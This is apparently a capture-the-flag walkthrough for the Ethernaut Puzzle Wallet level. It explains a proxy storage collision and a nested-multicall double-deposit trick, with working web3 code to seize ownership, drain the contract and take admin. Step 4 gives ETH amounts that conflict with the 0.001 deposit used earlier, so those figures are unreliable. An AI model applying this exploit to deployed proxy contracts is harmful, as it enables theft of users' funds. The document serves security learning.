# Level 24 - Puzzle Wallet

- Logic contract (PuzzleWallet) should have same variables in same order of proxy contract. Otherwise, state changes would effect wrong states.
    - In Proxy contract, two state variables are pendingAdmin and admin in order. However, in PuzzleWallet, they are owner and maxBalance in same order.
    - You can think like these two vars are linked to each other. If we change pendingAdmin, Owner will also point to that value. Additionally, if we try to change maxBalance, it will also change Admin value.
    - Reason of that is proxy delegatecalls the PuzzleWallet (logic) contract, and when delegatecall is used, changes are done in callers storage. Which means, called contracts code execution is done in proxy state/storage. It does operations on behalf of caller.
- Observations:
    - When we look at contract object methods, we see PuzzleWallets methods due to associated ABI. However, instance address is the address of proxy contract. Which means, when we call a method in js, we actually delegate call to the PuzzleWallet through proxy.
    - In order to call proxy contracts own methods, we need to encode payload and send transaction.
- PoC is as follows:
    1. We have to become owner of PuzzleWallet. In order to do that, we can call proposeNewAdmin function of proxy contract with relevant payload. This will change first storage’s value to our address. And allows us to become owner of PuzzleWallet (since it will check proxy’s first storage when we delegate call).
        
        ```jsx
        propose_payload = web3.eth.abi.encodeFunctionCall({
            name:'proposeNewAdmin',
            type:'function',
            inputs:[{
                type:'address',
                name:'_newAdmin'
            }]}, [player])
            
        sendTransaction({from:player,to:owner,data:propose_payload})
        ```
        
    2. Since we are owner now, we have to add ourself to whitelisted and change maxBalance to our address to become admin. 
        1. However, in order to change maxBalance, contract shouldn’t have any ETH balance.
    3. To change ETH balance, we need to withdraw with execute function. However, It doesn’t allow us to withdraw more than we deposited. 
        1. BUT, by exploiting multicall and deposit, we can deposit twice in one transaction. So we can call deposit with value 0.001 twice, it will only pay 0.001 but increase user balance twice.
        2. Multicall does not allowto call deposit function more than once, HOWEVER, we can call multicall inside multicall with deposit call. 
        3. To illustrate→ multicall ( [deposit, multicall ( [ deposit ] ) ] )
        4. What we have to do is preparing a payload for multicall([deposit]) first.
            1. deposit signature → 0xd0e30db0
            2. multicall signature → 0xac9650d8
            3. multicall params with only deposit → `web3.eth.abi.encodeParameter("bytes[]",["0xd0e30db0"])` → `0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000`
            4. signature + params → `0xac9650d8` + `0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000`
        5. Then we will call multicall directly → `contract.multicall([deposit_signature, multicall_sign_with_deposit_param])` 
        
        ```jsx
        contract.multicall(["0xd0e30db0","0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000"],{value: toWei("0.001")})
        ```
        
    4. Now contract’s balance is 0.02 (we deposited 0.01), but user balance is 0.02.
    5. Then we call execute to withdraw 0.02 eth and drain balance to zero.
    6. Then set maxBalance to player address to become admin. `contract.setMaxBalance(player)`